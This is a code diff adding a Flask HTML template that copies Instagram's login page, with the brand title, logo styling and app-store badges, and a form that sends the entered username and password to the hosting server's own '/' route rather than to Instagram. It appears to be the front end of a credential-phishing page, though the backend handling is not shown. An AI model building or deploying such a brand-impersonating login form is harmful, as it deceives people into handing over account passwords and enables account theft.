@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login - Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body>
+  <main>
+    <div class="left">
+      <img src="{{ url_for('static', filename='IG.jpeg') }}" alt="Instagram phone" />
+    </div>
+    <div class="form-div">
+      <form method="POST" action="/">
+        <h1 class="instagram-logo">Instagram</h1>
+        <input
+          class="input"
+          type="text"
+          name="username"
+          placeholder="Phone number, username, or email"
+          required
+        />
+        <input
+          class="input"
+          type="password"
+          name="password"
+          placeholder="Password"
+          required
+        />
+        <button class="login-btn" type="submit">Log In</button>
+      </form>
+
+      <div id="or">OR</div>
+
+      <button class="facebook-login">
+        Log in with Facebook
+      </button>
+
+      <a href="#" class="forgot-password">Forgot password?</a>
+
+      <div class="sign-up">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+
+      <div class="get-app">
+        Get the app.
+        <div class="store">
+          <img src="{{ url_for('static', filename='playStore.png') }}" alt="Google Play Store" id="play" />
+          <div id="app-store-container" title="Download on the Apple App Store">
+            <!-- Inline Apple SVG -->
+            <svg class="apple-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+              <path d="M16.365 1.43c-.67.02-1.45.47-1.916 1.04-.42.515-.783 1.317-.646 2.09.69.06 1.453-.38 1.918-.95.455-.54.763-1.315.645-2.18zM12.01 4.38c-2.61 0-4.96 2.21-4.96 6.22 0 3.01 2.026 6.53 4.96 6.53 2.522 0 4.3-2.165 4.3-2.165-.1-.07-.67-.97-.67-2.33 0-2.03 1.65-2.98 1.75-3.02-.97-1.41-2.48-1.6-3-1.6z"/>
+            </svg>
+          
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
